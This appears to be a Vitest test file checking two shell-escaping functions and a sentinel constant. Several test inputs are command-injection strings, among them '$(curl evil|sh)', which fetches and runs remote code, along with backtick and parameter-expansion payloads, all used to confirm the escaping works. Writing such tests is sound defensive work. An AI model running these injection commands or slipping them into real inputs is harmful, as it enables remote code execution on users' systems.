import { describe, expect, it } from 'vitest';
import {
  escapeForShellDoubleQuoted,
  escapeShellArg,
  WORKTREE_FLAG_ONLY,
} from '../shell.ts';

describe('escapeShellArg', () => {
  it('passes safe charset values through verbatim', () => {
    expect(escapeShellArg('feature-a_1.2/x')).toBe('feature-a_1.2/x');
  });

  it('escapes command substitution $(...)', () => {
    expect(escapeShellArg('$(curl evil|sh)')).toBe('"\\$(curl evil|sh)"');
  });

  it('escapes backtick command substitution', () => {
    expect(escapeShellArg('`id`')).toBe('"\\`id\\`"');
  });

  it('escapes parameter expansion ${...}', () => {
    expect(escapeShellArg('${HOME}')).toBe('"\\${HOME}"');
  });

  it('escapes backslashes before other special chars', () => {
    expect(escapeShellArg('a\\$b')).toBe('"a\\\\\\$b"');
  });

  it('escapes embedded double quotes', () => {
    expect(escapeShellArg('say "hi"')).toBe('"say \\"hi\\""');
  });
});

describe('escapeForShellDoubleQuoted', () => {
  it('leaves plain text untouched', () => {
    expect(escapeForShellDoubleQuoted('run the plan')).toBe('run the plan');
  });

  it('escapes backslashes first so later passes are not double-escaped', () => {
    expect(escapeForShellDoubleQuoted('a\\$b')).toBe('a\\\\\\$b');
  });

  it('neutralizes command substitution $(...)', () => {
    expect(escapeForShellDoubleQuoted('$(curl evil|sh)')).toBe(
      '\\$(curl evil|sh)',
    );
  });

  it('neutralizes backticks', () => {
    expect(escapeForShellDoubleQuoted('`id`')).toBe('\\`id\\`');
  });

  it('neutralizes parameter expansion ${...}', () => {
    expect(escapeForShellDoubleQuoted('${HOME}')).toBe('\\${HOME}');
  });

  it('escapes embedded double quotes', () => {
    expect(escapeForShellDoubleQuoted('say "hi"')).toBe('say \\"hi\\"');
  });
});

describe('WORKTREE_FLAG_ONLY', () => {
  it('is the empty-string sentinel', () => {
    expect(WORKTREE_FLAG_ONLY).toBe('');
  });
});
